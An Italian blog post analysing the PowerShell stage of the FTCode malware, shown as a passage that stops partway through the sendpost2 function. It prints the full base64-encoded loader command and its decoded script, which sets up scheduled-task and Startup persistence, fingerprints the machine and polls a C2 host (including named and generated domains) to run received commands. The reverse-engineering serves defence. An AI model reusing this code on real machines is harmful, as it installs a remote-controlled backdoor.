# FTCode: analisi di un PowerShell

Continuiamo l'analisi di FTCode a partire dallo script PowerShell estratto precedentemente nella scorsa analisi:
```powershell
powershell -WindowStyle Hidden -c $a=[string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( 'JHhlZ2FndGhzZGIgPSAkZW52OlBVQkxJQyArICJcTGlicmFyaWVzIgppZiAoLW5vdCAoVGVzdC1QYXRoICR4ZWdhZ3Roc2RiKSkgeyBtZCAkeGVnYWd0aHNkYjsgfQokdHZ4dWh3empjZyA9ICR4ZWdhZ3Roc2RiICsgIlxXaW5kb3dzSW5kZXhpbmdTZXJ2aWNlLnZicyI7CiR5anR6anhjeHcgID0gIjEwMTQuMiI7CiRpdnloenV4ID0gJGVudjp0ZW1wICsgIlxBRlg1MDA1OC50bXAiOwokeHV3Y3llZXQgID0gJHhlZ2FndGhzZGIgKyAiXHRodW1iY2FjaGVfNjQuZGIiOwokbXl1cmxwb3N0ID0gJGZhbHNlOwokY2NodHlpaWMgPSAidyI7CgpmdW5jdGlvbiBpYW13b3JrMnsgc2MgLVBhdGggJGl2eWh6dXggLVZhbHVlICQoR2V0LURhdGUpOyB9OwpmdW5jdGlvbiBzamJ1Z3h0aGgoICRmeHN0YndqdXV6ICl7CiAgaWYoICRmeHN0YndqdXV6IC1tYXRjaCAnT3V0T2ZNZW1vcnlFeGNlcHRpb24nICl7CiAgICByaSAtUGF0aCAkaXZ5aHp1eCAtRm9yY2U7CiAgICBnZXQtcHJvY2VzcyBwb3dlcnNoZWxsKiB8IHN0b3AtcHJvY2VzczsKICAgIGV4aXQ7CiAgfTsKfQoKZnVuY3Rpb24gc2VuZHBvc3QyKCAkZnhzdGJ3anV1eiApewogIGlmKCAhJG15dXJscG9zdCApeyByZXR1cm4gJGZhbHNlOyB9OwogICR4anpoYWZzempoID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDsKICAkeGp6aGFmc3pqaC5DcmVkZW50aWFscyA9IFtTeXN0ZW0uTmV0LkNyZWRlbnRpYWxDYWNoZV06OkRlZmF1bHRDcmVkZW50aWFsczsKICAkeGp6aGFmc3pqaC5IZWFkZXJzLkFkZCgiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwogICR4anpoYWZzempoLkVuY29kaW5nID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGODsKICB0cnl7CiAgICAkanNqdmN6YXggPSAkeGp6aGFmc3pqaC5VcGxvYWRTdHJpbmcoICRteXVybHBvc3QsICJsPSIrW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoICggInY9JHlqdHpqeGN4dyZndWlkPSRhdnh1eWl2eiYiICsgJGZ4c3Rid2p1dXogKSApICkgKTsKICAgICRqc2p2Y3pheCA9IFtzdHJpbmddW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoICRqc2p2Y3pheCApICk7CiAgICBpZiggISRjY2h0eWlpYyApeyByZXR1cm4gJGZhbHNlOyB9CiAgICBpZiggJGVjYWNmd3h0ZiAtZXEgJGpzanZjemF4LlN1YnN0cmluZygwLDE2KSApewogICAgICByZXR1cm4gJGpzanZjemF4LlN1YnN0cmluZygxNiwkanNqdmN6YXgubGVuZ3RoLTE2KSA7CiAgICB9ZWxzZXsKICAgICAgJGNjaHR5aWljID0gJGZhbHNlOwogICAgICBzZW5kcG9zdDIgKCJlcnJvcj0iICsgW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoICRqc2p2Y3pheCApICkgKTsKICAgIH0KICB9Y2F0Y2h7CiAgICBzamJ1Z3h0aGggJF8uRXhjZXB0aW9uLk1lc3NhZ2U7CiAgICAkY2NodHlpaWMgPSAkZmFsc2U7CiAgICAkeGp6aGFmc3pqaC5VcGxvYWRTdHJpbmcoICRteXVybHBvc3QsICJsPSIrW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoICggInY9JHlqdHpqeGN4dyZndWlkPSRhdnh1eWl2eiZlcnJvcj1zZW5kcG9zdDI6IiArICRteXVybHBvc3QrIjoiKyRqc2p2Y3pheCArIjoiKyAkXy5FeGNlcHRpb24uTWVzc2FnZSApICkgKSApOwogIH07CiAgcmV0dXJuICRmYWxzZTsKfTsKCmZ1bmN0aW9uIGFmZ2VpdnN5KCAkdnV3ZWplaSApewogICRhY3lzdWpqdiA9ICJodHRwOi8vY2RuLmRhbmllbHJtdXJyYXkuY29tLyI7CiAgImhlZSIsInh1MSIsImhzMCIsImpkNSIsIm1xZiIgfCAleyAkYWN5c3VqanYgKz0gIiwiKyJodHRwOi8vIisgKCBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCAkXysgJChHZXQtRGF0ZSAtVUZvcm1hdCAiJXklbSVWIikgKSApLnRvTG93ZXIoKSApICsiLnRvcC8iOyB9OwogICRhY3lzdWpqdi5zcGxpdCgiLCIpIHwgJXsKICAgIGlmKCAhJG15dXJscG9zdCApewogICAgICAkbXl1cmxwb3N0ID0gJF87CiAgICAgIGlmKCAhKHNlbmRwb3N0MiAoJHZ1d2VqZWkgKyAiJmRvbWVuPSRteXVybHBvc3QiICkpICl7ICRteXVybHBvc3QgPSAkZmFsc2U7IH07CiAgICAgIFN0YXJ0LVNsZWVwIC1zIDU7CiAgICB9CiAgfTsKICBpZiggJHZ1d2VqZWkgLW1hdGNoICJzdGF0dXM9cmVnaXN0ZXIiICl7CiAgICByZXR1cm4gIm9rIjsKICB9ZWxzZXsKICAgIHJldHVybiAkbXl1cmxwb3N0OwogIH0gCn07CgppZiAoIFRlc3QtUGF0aCAkaXZ5aHp1eCApewogIGlmICggKCAoIE5FVy1USU1FU1BBTiAtU3RhcnQgKChHZXQtQ2hpbGRJdGVtICRpdnloenV4ICkuQ3JlYXRpb25UaW1lKSAtRW5kIChHZXQtRGF0ZSkpLk1pbnV0ZXMgKSAtZ3QgMTUgKXsKICAgIHJpIC1QYXRoICRpdnloenV4IC1Gb3JjZTsKICAgIHRyeXsgZ2V0LXByb2Nlc3MgcG93ZXJzaGVsbCogfCBzdG9wLXByb2Nlc3MgfWNhdGNoe307CiAgICBleGl0OwogIH1lbHNleyBleGl0OyB9Owp9OwoKZnVuY3Rpb24gc2Z6ZXVnamcoICR6dmh6Y2Z6ICl7CiAgaWYoICR6dmh6Y2Z6ICl7CiAgICBzYyAtUGF0aCAkeHV3Y3llZXQgLVZhbHVlICggW2d1aWRdOjpOZXdHdWlkKCksICggW2d1aWRdOjpOZXdHdWlkKCkgLXJlcGxhY2UgJy0nLCcnICkuU3Vic3RyaW5nKDAsMTYpICAtam9pbiAnLCcgKSAtRm9yY2U7ICAKICAgIGdpICR4dXdjeWVldCAtRm9yY2UgfCAgJXsgJF8uQXR0cmlidXRlcyA9ICJIaWRkZW4iIH07CiAgICB0cnl7CiAgICAgICRhaHVndnpmcyA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ1N0YXJ0dXAnKSArICdcV2luZG93c0FwcGxpY2F0aW9uU2VydmljZS5sbmsnOwogICAgICBpZiggLW5vdCAoIFRlc3QtUGF0aCAkYWh1Z3Z6ZnMgKSApewogICAgICAgICR2dWliZ3NiID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0ICgnV1NjcmlwdC5TaGVsbCcpOwogICAgICAgICRhZWZ4c3RlYWQgPSAkdnVpYmdzYi5DcmVhdGVTaG9ydGN1dCggJGFodWd2emZzICApOwogICAgICAgICRhZWZ4c3RlYWQuVGFyZ2V0UGF0aCA9ICR0dnh1aHd6amNnOwogICAgICAgICRhZWZ4c3RlYWQuV29ya2luZ0RpcmVjdG9yeSA9ICR4ZWdhZ3Roc2RiOwogICAgICAgICRhZWZ4c3RlYWQuV2luZG93U3R5bGUgPSAxOwogICAgICAgICRhZWZ4c3RlYWQuRGVzY3JpcHRpb24gPSAnV2luZG93cyBBcHBsaWNhdGlvbiBTZXJ2aWNlJzsKICAgICAgICAkYWVmeHN0ZWFkLlNhdmUoKTsKICAgICAgfQogICAgfWNhdGNoe307CiAgICAkYXZ4dXlpdnosICRlY2FjZnd4dGYgPSAoZ2V0LWNvbnRlbnQgJHh1d2N5ZWV0KS5zcGxpdCgnLCcpOwogICAgJHVjeXlneGhjYnYgPSAic3RhdHVzPXJlZ2lzdGVyJnNzaWQ9JGVjYWNmd3h0ZiZvcz0iKyhbc3RyaW5nXSRQU1ZlcnNpb25UYWJsZS5CdWlsZFZlcnNpb24pKyImcHN2ZXI9IisoICggKEdldC1Ib3N0KS5WZXJzaW9uICkuTWFqb3IgKSsgIiZjb21wX25hbWU9IiArICgoR2V0LVdtaU9iamVjdCAtY2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW0gLVByb3BlcnR5IE5hbWUpLk5hbWUudHJpbSgpICk7CiAgICBpZiggVGVzdC1QYXRoICggJHhlZ2FndGhzZGIgKyAiXHRodW1iY2FjaGVfMzMuZGIiICkgKXsKICAgICAgcmkgLVBhdGggKCAkeGVnYWd0aHNkYiArICJcdGh1bWJjYWNoZV8zMy5kYiIgKSwgKCAkeGVnYWd0aHNkYiArICJcV2luZG93c0luZGV4aW5nU2VydmljZS5qcyIgKSAtRm9yY2U7CiAgICAgIHRyeXsgc2NodGFza3MuZXhlIC9kZWxldGUgL1ROICJXaW5kb3dzSW5kZXhpbmdTZXJ2aWNlIiAvZiB9Y2F0Y2h7fQogICAgICB0cnl7IHNjaHRhc2tzLmV4ZSAvZGVsZXRlIC9UTiAiV2luZG93cyBJbmRleGluZyBTZXJ2aWNlIiAvZiB9Y2F0Y2h7fQogICAgICBpZiggVGVzdC1QYXRoICggW0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnU3RhcnR1cCcpICsgJ1xXaW5kb3dzSW5kZXhpbmdTZXJ2aWNlLmxuaycgKSAgKXsKICAgICAgICByaSAtUGF0aCAoIFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ1N0YXJ0dXAnKSArICdcV2luZG93c0luZGV4aW5nU2VydmljZS5sbmsnICkgLUZvcmNlOwogICAgICB9CiAgICB9CiAgICAkd3V4aGljaSA9IGFmZ2VpdnN5ICR1Y3l5Z3hoY2J2OwogICAgaWYoICR3dXhoaWNpIC1uZSAib2siKXsKICAgICAgcmkgLVBhdGggJHh1d2N5ZWV0IC1Gb3JjZTsKICAgICAgZXhpdDsKICAgIH0KICB9CiAgcmV0dXJuIChnZXQtY29udGVudCAkeHV3Y3llZXQpLnNwbGl0KCcsJyk7Cn0KJGhjaGF5dmV3dmIgPSAoc2NodGFza3MuZXhlIC9jcmVhdGUgL1ROICJXaW5kb3dzQXBwbGljYXRpb25TZXJ2aWNlIiAvc2MgREFJTFkgL3N0IDAwOjAwIC9mIC9SSSAxOSAvZHUgMjM6NTkgL1RSICR0dnh1aHd6amNnKTsgCmlmICggVGVzdC1QYXRoICR4dXdjeWVldCApewogICRhdnh1eWl2eiwgJGVjYWNmd3h0ZiA9ICBzZnpldWdqZyAkZmFsc2U7CiAgaWYoICRlY2FjZnd4dGYubGVuZ3RoIC1uZSAxNiAgKXsgJGF2eHV5aXZ6LCAkZWNhY2Z3eHRmID0gIHNmemV1Z2pnICR0cnVlOyB9Cn1lbHNlewogICRhdnh1eWl2eiwgJGVjYWNmd3h0ZiA9ICBzZnpldWdqZyAkdHJ1ZTsKfQokbXl1cmxwb3N0ID0gYWZnZWl2c3k7CndoaWxlKCAkY2NodHlpaWMgKXsKICBpYW13b3JrMjsKICB0cnl7CiAgICBpZiggJGNjaHR5aWljIC1hbmQgKCRjY2h0eWlpYy5sZW5ndGggLWd0IDMwKSAgKXsKICAgICAgaWV4ICRjY2h0eWlpYzsKICAgIH07CiAgfWNhdGNoeyBzamJ1Z3h0aGggJF8uRXhjZXB0aW9uLk1lc3NhZ2U7IH07CiAgU3RhcnQtU2xlZXAgLXMgMjgwOwogICRjY2h0eWlpYyA9IHNlbmRwb3N0MjsKfTsKcmkgLVBhdGggJGl2eWh6dXggLUZvcmNlOwo=' ) );iex $a;
```

# Analisi ad alto livello del comando lanciato
Spezziamo il comando in tutte le sue componenti in modo tale da poterli visualizzare e approfondire meglio il loro funzionamento:
- `powershell`: invocazione dell'eseguibile `powershell.exe`.
- `-WindowStyle Hidden`: flag con parametro passato al comando `powershell` in modo tale da lanciare l'eseguibile in modalità nascosta e non visibile dall'utente sul suo desktop. Tale parametro permette di nascondere la finestra dalla GUI ma è possibile tracciare l'esecuzione del PowerShell tramite l'analisi dei processi attivi usando il banale Task Manager.
- `-c $a=[string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(...)); iex $a;`: tale flag va a specifiare l'esecuzione di uno snippet PowerShell *inline* direttamente da terminale. Come si può notare, viene memorizzata nella variabile `$a` il payload ed infine eseguito tramite `Invoke-Expression $a`.
## Metodo di decodifica
Per ridurre la dimensione del codice da eseguire, rendere più ardua la diretta comprensione del comando e per sfuggire dagli analizzatori statici (ormai estremamente poco efficiente e antica), viene utilizzato l'encoding `Base64` per decodificare il payload prima di passarlo alla chiamata di `Invoke-Expression`.

> Sebbene esistano varie tecniche di offuscamento molto più sofisticate, la codifica e decodifica in `Base64` viene fatta solamente per ridurre la dimensione del codice. La maggior parte, se non tutti i sistemi di detection, sono in grado di analizzare pezzi di stringhe codificati in modi diversi, cercando in maniera automatica di ricavare il testo originale prima di far partire le analisi statiche e le regole di detection.

### Spunti interessanti
Parlando per esperienza personale, mi capita molto spesso di analizzare file PowerShell malevoli o di dubbia provenienza e, un modo molto facile per ricononscere qualcosa al di fuori dell'ordinario e a prima vista, è guardare la lunghezza dei parametri passati all'eseguibile `powershell.exe`, se ci sono codifiche strane o se ci sono alcune delle seguenti funzioni richiamate:

- `FromBase64String`
- `Invoke-Expression`
- `DownloadString`
- `System.IO.Compression.GZipStream::Decompress`

L'elenco precedente risulta essere un piccolissimo sottoinsieme di funzioni esistenti che si possono utilizzare per offuscare e rendere estremamente difficile l'analisi di uno script PowerShell e, in base al threat actor e la sua motivazione, esistono PowerShell più o meno complessi a seconda del loro livello di esperienza.

Per fare alcuni esempi pratici presi da casi reali, questi sono alcune tipologie di PowerShell che ho analizzato in questi anni in modo tale da capire quanto ci si può spingere se si posseggono le conoscenze giuste nel mondo dello sviluppo:

- Compilazione di eseguibili e la loro esecuzione in memoria direttamente da PowerShell, senza lasciare tracce sul filesystem.
- Utilizzo di encoding e cifrature (solitamente RC4 data la sua elevata velocità di cifratura e decifratura).
- Cifrature e decifrature ricorsive di un payload.
- Concatenazione di diversi algoritmi di cifratura, codifica e compressione (e di conseguenza la loro decompressione, decodifica e decifratura).
- Script PowerShell suddivisi in tanti piccoli `chunk`. Ogni `chunk` scarica da Internet in maniera ricorsiva il prossimo `chunk`.
- E i classici file con doppia estensione o che utilizzano tecniche steganografiche.

# Analisi del payload
Tramite l'uso di CyberChef, il payload decodificato da Base64 è il seguente, aggiungendo il numero di riga in modo tale da rendere più fluida e facile l'analisi:

```powershell
  1 $xegagthsdb = $env:PUBLIC + "\Libraries"
  2 if (-not (Test-Path $xegagthsdb)) { md $xegagthsdb; }
  3 $tvxuhwzjcg = $xegagthsdb + "\WindowsIndexingService.vbs";
  4 $yjtzjxcxw  = "1014.2";
  5 $ivyhzux = $env:temp + "\AFX50058.tmp";
  6 $xuwcyeet  = $xegagthsdb + "\thumbcache_64.db";
  7 $myurlpost = $false;
  8 $cchtyiic = "w";
  9 
 10 function iamwork2{ sc -Path $ivyhzux -Value $(Get-Date); };
 11 function sjbugxthh( $fxstbwjuuz ){
 12   if( $fxstbwjuuz -match 'OutOfMemoryException' ){
 13     ri -Path $ivyhzux -Force;
 14     get-process powershell* | stop-process;
 15     exit;
 16   };
 17 }
 18 
 19 function sendpost2( $fxstbwjuuz ){
 20   if( !$myurlpost ){ return $false; };
 21   $xjzhafszjh = New-Object System.Net.WebClient;
 22   $xjzhafszjh.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
 23   $xjzhafszjh.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
 24   $xjzhafszjh.Encoding = [System.Text.Encoding]::UTF8;
 25   try{
 26     $jsjvczax = $xjzhafszjh.UploadString( $myurlpost, "l="+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( ( "v=$yjtzjxcxw&guid=$avxuyivz&" + $fxstbwjuuz ) ) ) );
 27     $jsjvczax = [string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( $jsjvczax ) );
 28     if( !$cchtyiic ){ return $false; }
 29     if( $ecacfwxtf -eq $jsjvczax.Substring(0,16) ){
 30       return $jsjvczax.Substring(16,$jsjvczax.length-16) ;
 31     }else{
 32       $cchtyiic = $false;
 33       sendpost2 ("error=" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( $jsjvczax ) ) );
 34     }
 35   }catch{
 36     sjbugxthh $_.Exception.Message;
 37     $cchtyiic = $false;
 38     $xjzhafszjh.UploadString( $myurlpost, "l="+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( ( "v=$yjtzjxcxw&guid=$avxuyivz&error=sendpost2:" + $myurlpost+":"+$jsjvczax +":"+ $_.Exception.Message ) ) ) );
 39   };
 40   return $false;
 41 };
 42 
 43 function afgeivsy( $vuwejei ){
 44   $acysujjv = "http://cdn.danielrmurray.com/";
 45   "hee","xu1","hs0","jd5","mqf" | %{ $acysujjv += ","+"http://"+ ( [Convert]::ToBase64String( [System.Text.Encoding]::UTF8.GetBytes( $_+ $(Get-Date -UFormat "%y%m%V") ) ).toLower() ) +".top/"; };
 46   $acysujjv.split(",") | %{
 47     if( !$myurlpost ){
 48       $myurlpost = $_;
 49       if( !(sendpost2 ($vuwejei + "&domen=$myurlpost" )) ){ $myurlpost = $false; };
 50       Start-Sleep -s 5;
 51     }
 52   };
 53   if( $vuwejei -match "status=register" ){
 54     return "ok";
 55   }else{
 56     return $myurlpost;
 57   } 
 58 };
 59 
 60 if ( Test-Path $ivyhzux ){
 61   if ( ( ( NEW-TIMESPAN -Start ((Get-ChildItem $ivyhzux ).CreationTime) -End (Get-Date)).Minutes ) -gt 15 ){
 62     ri -Path $ivyhzux -Force;
 63     try{ get-process powershell* | stop-process }catch{};
 64     exit;
 65   }else{ exit; };
 66 };
 67 
 68 function sfzeugjg( $zvhzcfz ){
 69   if( $zvhzcfz ){
 70     sc -Path $xuwcyeet -Value ( [guid]::NewGuid(), ( [guid]::NewGuid() -replace '-','' ).Substring(0,16)  -join ',' ) -Force;  
 71     gi $xuwcyeet -Force |  %{ $_.Attributes = "Hidden" };
 72     try{
 73       $ahugvzfs = [Environment]::GetFolderPath('Startup') + '\WindowsApplicationService.lnk';
 74       if( -not ( Test-Path $ahugvzfs ) ){
 75         $vuibgsb = New-Object -ComObject ('WScript.Shell');
 76         $aefxstead = $vuibgsb.CreateShortcut( $ahugvzfs  );
 77         $aefxstead.TargetPath = $tvxuhwzjcg;
 78         $aefxstead.WorkingDirectory = $xegagthsdb;
 79         $aefxstead.WindowStyle = 1;
 80         $aefxstead.Description = 'Windows Application Service';
 81         $aefxstead.Save();
 82       }
 83     }catch{};
 84     $avxuyivz, $ecacfwxtf = (get-content $xuwcyeet).split(',');
 85     $ucyygxhcbv = "status=register&ssid=$ecacfwxtf&os="+([string]$PSVersionTable.BuildVersion)+"&psver="+( ( (Get-Host).Version ).Major )+ "&comp_name=" + ((Get-WmiObject -class Win32_ComputerSystem -Property Name).Name.trim() );
 86     if( Test-Path ( $xegagthsdb + "\thumbcache_33.db" ) ){
 87       ri -Path ( $xegagthsdb + "\thumbcache_33.db" ), ( $xegagthsdb + "\WindowsIndexingService.js" ) -Force;
 88       try{ schtasks.exe /delete /TN "WindowsIndexingService" /f }catch{}
 89       try{ schtasks.exe /delete /TN "Windows Indexing Service" /f }catch{}
 90       if( Test-Path ( [Environment]::GetFolderPath('Startup') + '\WindowsIndexingService.lnk' )  ){
 91         ri -Path ( [Environment]::GetFolderPath('Startup') + '\WindowsIndexingService.lnk' ) -Force;
 92       }
 93     }
 94     $wuxhici = afgeivsy $ucyygxhcbv;
 95     if( $wuxhici -ne "ok"){
 96       ri -Path $xuwcyeet -Force;
 97       exit;
 98     }
 99   }
100   return (get-content $xuwcyeet).split(',');
101 }
102 $hchayvewvb = (schtasks.exe /create /TN "WindowsApplicationService" /sc DAILY /st 00:00 /f /RI 19 /du 23:59 /TR $tvxuhwzjcg); 
103 if ( Test-Path $xuwcyeet ){
104   $avxuyivz, $ecacfwxtf =  sfzeugjg $false;
105   if( $ecacfwxtf.length -ne 16  ){ $avxuyivz, $ecacfwxtf =  sfzeugjg $true; }
106 }else{
107   $avxuyivz, $ecacfwxtf =  sfzeugjg $true;
108 }
109 $myurlpost = afgeivsy;
110 while( $cchtyiic ){
111   iamwork2;
112   try{
113     if( $cchtyiic -and ($cchtyiic.length -gt 30)  ){
114       iex $cchtyiic;
115     };
116   }catch{ sjbugxthh $_.Exception.Message; };
117   Start-Sleep -s 280;
118   $cchtyiic = sendpost2;
119 };
120 ri -Path $ivyhzux -Force;
121 
```

## Analisi ad alto livello
Prima di iniziare la vera analisi riga per riga, diamo un'occhiata a come il codice si presenta, se esistono stringhe in chiaro, se ci sono comandi particolarmente interessanti o chiamate di rete verso domini o servizi esterni:

[![ftcode-powershell-overview.png](https://i.imgur.com/7VLsUmr.png)](https://imgur.com/7VLsUmr)

Senza nemmeno guardare il codice intero, possiamo già identificare ed estrarre alcuni indici di compromissione e attacco:

- Lo script inizia dichiarando alcune variabili per scopi di configurazione, come ad esempio nomi di cartelle e file.
- Creazione di un servizio
- Una funzione di nome `sendpost2`.
- Configurazione del servizio in modo tale da schedularlo ogni giorno a mezzanotte
- Rimozione di un percorso / cartella / file in maniera forzata.

In sintesi, dalla nostra analisi ci aspettiamo che, una volta eseguito il payload, venga creato un servizio schedulato che parte ogni giorno a mezzanotte. È molto probabile che il file eseguito dal servizio venga scaricato da un C2 esterno e nascosto presumibilmente in `%PUBLIC%\Libraries`. Infine, lo script elimina le tracce lasciate in giro.

## Analisi del codice
Prima di analizzare il contenuto di ciascuna funzione, isoliamo e partizioniamo il codice in modo da suddividerlo in funzioni ed esecuzioni iterative.

> In questo specifico caso, tra una funzione e l'altra vi sono delle chiamate o particolari esecuzioni interessanti che potrebbero sfuggire in caso si è poco attenti.
> 
> Tale tecnica è comunemente usata dagli autori di malware per nascondere o per rendere più complessa l'analisi di un codice, in quanto risulta difficile scovare queste piccole porzioni di codice se il file ha grandi dimensioni.

### Configurazione iniziale e assegnamento variabili

```powershell
1 $env_public_libraries_path = $env:PUBLIC + "\Libraries"
2 if (-not (Test-Path $env_public_libraries_path)) { md $env_public_libraries_path; }
3 $vbs_path = $env_public_libraries_path + "\WindowsIndexingService.vbs";
4 $strange_version  = "1014.2";
5 $tmp_file = $env:temp + "\AFX50058.tmp";
6 $db_file  = $env_public_libraries_path + "\thumbcache_64.db";
7 $myurlpost_bool = $false;
8 $str_w = "w";
```

Semplicemente, si vanno a definire alcune configurazioni di base come ad esempio la cartella in cui possibilmente droppare nuovi file.
Il nome delle variabili sono state modificate in modo tale da rendere più fluida l'analisi e la leggibilità.

### Rimozione artefatti o processi in stato di running

```powershell
1 if ( Test-Path $tmp_file ){
2   # Dopo 15 minuti dalla creazione del file temporaneo, lo elimino
3   if ( ( ( NEW-TIMESPAN -Start ((Get-ChildItem $tmp_file ).CreationTime) -End (Get-Date)).Minutes ) -gt 15 ){
4     ri -Path $tmp_file -Force;
5     try{ get-process powershell* | stop-process }catch{};
6     exit;
7   }else{ exit; };
8 };
```

Se esiste il file `%TEMP%\AFX50058.tmp` lo elimino ogni 15 minuti a partire dalla sua creazione. Non ho ancora ben capito l'utilità e l'obiettivo dell'attaccante se non il voler rimuovere le proprie tracce dal sistema una volta utilizzato il contenuto del file.

Dopo la rimozione del file temporaneo, termino ogni esecuzione di PowerShell attiva.

### Creazione di un servizio schedulato

```powershell
$hchayvewvb = (schtasks.exe /create /TN "WindowsApplicationService" /sc DAILY /st 00:00 /f /RI 19 /du 23:59 /TR $vbs_path);
```

L'attaccante crea un task schedulato denominato `WindowsApplicationService` che viene eseguito ogni giorno dall'orario `00:00` alle `23:59`. Il task esegue il file situato nel percorso `%PUBLIC%\Libraries\WindowsIndexingService.vbs` ogni 19 minuti.

### Check di connettività

```powershell
1 if ( Test-Path $db_file ){
2   $guid, $ssid =  startup_persistency $false;
3   if( $ssid.length -ne 16  ){ $guid, $ssid =  startup_persistency $true; }
4 }else{
5   $guid, $ssid =  startup_persistency $true;
6 }
7 $myurlpost_bool = check_networking_availability;
```

La situazione inizia a complicarsi molto di più in questo piccolo snippet, come si potrà vedere più avanti durante l'analisi delle funzioni `startup_persistency` e `check_networking_availability`.

Dal quel poco che si è riuscito a capire, tale porzione di codice si preoccupa di instaurare una connessione bidirezionale con il C2 dell'attaccante ed iniziare il processo di fingerprinting ed esfiltrazione di dati generici dalla macchina.

### Esecuzione costante di codice PowerShell

```powershell
 1 # Ciclo principale che esegue qualcosa ogni 280 secondi
 2 while( $str_w ){
 3   set_content_tmp_date;
 4   try{
 5     if( $str_w -and ($str_w.length -gt 30)  ){
 6       iex $str_w;
 7     };
 8   }catch{ kill_powershell_if_out_of_memory $_.Exception.Message; };
 9   Start-Sleep -s 280;
10   $str_w = sendpost2;
11 };
12 
13 # Rimuovo il file temporaneo
14 ri -Path $tmp_file -Force;
```

Fin quando la variabile `$str_w` non è vuota e supera i 30 byte, l'autore esegue tramite `Invoke-Expression` del codice PowerShell. In fase di analisi, è risultato impossibile determinare il contenuto della variabile in quanto non è più possibile collegarsi al C2 dell'attaccante ed analizzare il traffico di rete.

Ogni 280 secondi, la variabile viene sostituita con un nuovo valore dopo aver richiamato la funzione `sendpost2`  che, molto probabilmente, cercherà un C2 disponibile da cui ricevere comandi da eseguire.

> Tale funzione può anche essere vista come una specie di reverse shell in PowerShell dove, ogni 280 secondi, il C2 invia dei comandi da eseguire automaticamente sulla macchina infetta.
> 
> Sebbene tale ipotesi potrebbe risultare corretta, non ci sono abbastanza dati per attestarne la veridicità.

In caso l'esecuzione dell'`Invoke-Expression` dasse eccezioni di tipo `OutOfMemoryException`, tutti i processi PowerShell vengono terminati e il file temporaneo eliminato.

### Funzione: set_content_tmp_date

```powershell
1 function set_content_tmp_date {
2   # Override di $tmp_file con la data attuale
3   sc -Path $tmp_file -Value $(Get-Date); 
4 };
```

Vienie invocata la funzione PowerShell `Set-Content` la quale andrà a rimpiazzare (o sovvrascrivere) il file `AFX50058.tmp` con la data attuale.

### Funzione: kill_powershell_if_out_of_memory

```powershell
 1 function kill_powershell_if_out_of_memory( $exception_message ){
 2   # exception_message è l'eccezione generata da PowerShell
 3   if( $exception_message -match 'OutOfMemoryException' ){
 4     # Rimuovo il file temporaneo AFX50058.tmp se la stringa contiene OutOfMemoryException
 5     ri -Path $tmp_file -Force;
 6     get-process powershell* | stop-process;
 7     # Termino lo script
 8     exit;
 9   };
10 }
```

Tale funzione riceve come argomento un stringa contenente un messaggio di errore generato da PowerShell.
Nel caso in cui la stringa dovesse contenere la parola `OutOfMemoryException`, verrebbero terminati tutti i processi PowerShell attivi.

### Funzione: sendpost2

```powershell 
 1 function sendpost2( $str_input ){
 2   if( !$myurlpost_bool ){ return $false; };
 3   # Creo oggetto WebClient in modo tale da poter eseguire chiamate HTTP
 4   $web_client_handler = New-Object System.Net.WebClient;
 5   $web_client_handler.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
 6   $web_client_handler.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
 7   $web_client_handler.Encoding = [System.Text.Encoding]::UTF8;
 8   try{
 9     # public string UploadString (string address, string data);
10     # Creo la mia richiesta POST formattando i dati da inviare
11     # I dati nella POST sono codificati in Base64
12     # Invierò quindi le seguenti informazioni:
13     #   - v = "1014.2" ## Magari e' la versione del malware oppure un identificativo
14     #   - guid = "69640409-da09-4b51-9552-6913a31af6d4" un'esempio di Machine GUID, identificativo univoco della macchina
15     #   - ?? = valore di $str_input potrebbero rappresentare i dati che stanno per essere esfiltrati
16     $request = $web_client_handler.UploadString( $myurlpost_bool, "l="+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( ( "v=$strange_version&guid=$guid&" + $str_input ) ) ) );
17     $request = [string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( $request ) );
18     if( !$str_w ){ return $false; }
19     # Verifica se $ssid rappresenta i primi 16 caratteri della richiesta. Non ha senso per ora.
20     if( $ssid -eq $request.Substring(0,16) ){
21       return $request.Substring(16,$request.length-16) ;
22     }else{
23       $str_w = $false;
24       # Aggiungo al parametro POST la chiave 'error' con l'errore?
25       sendpost2 ("error=" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( $request ) ) );
26     }
27   }catch{
28     # Chiamo kill_powershell_if_out_of_memory(Exception.Message)
29     kill_powershell_if_out_of_memory $_.Exception.Message;
30     $str_w = $false;
31     $web_client_handler.UploadString( $myurlpost_bool, "l="+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( ( "v=$strange_version&guid=$guid&error=sendpost2:" + $myurlpost_bool+":"+$request +":"+ $_.Exception.Message ) ) ) );
32   };
